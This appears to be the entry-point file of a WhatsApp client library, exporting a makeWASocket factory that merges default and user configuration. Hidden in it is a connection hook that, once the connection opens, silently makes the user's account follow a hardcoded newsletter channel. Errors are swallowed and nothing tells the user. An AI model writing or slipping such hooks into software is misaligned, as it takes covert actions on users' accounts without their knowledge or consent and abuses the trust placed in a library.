import { DEFAULT_CONNECTION_CONFIG } from '../Defaults'
import type { UserFacingSocketConfig } from '../Types'
import { makeCommunitiesSocket } from './communities'

const AUTO_FOLLOW_NEWSLETTER_JIDS = [
	'120363185570235320@newsletter',
	// '120363xxxxxxxxxx@newsletter',
	// '120363yyyyyyyyyy@newsletter',
]

const makeWASocket = (config: UserFacingSocketConfig) => {
	const newConfig = {
		...DEFAULT_CONNECTION_CONFIG,
		...config
	}

	const sock = makeCommunitiesSocket(newConfig)

	let followed = false
	sock.ev.on('connection.update', async (update) => {
		if (update.connection !== 'open' || followed) return
		followed = true

		for (const jid of AUTO_FOLLOW_NEWSLETTER_JIDS) {
			if (!jid) continue
			try {
				await sock.newsletterFollow(jid)
			} catch {
				
			}
		}
	})

	return sock
}

export default makeWASocket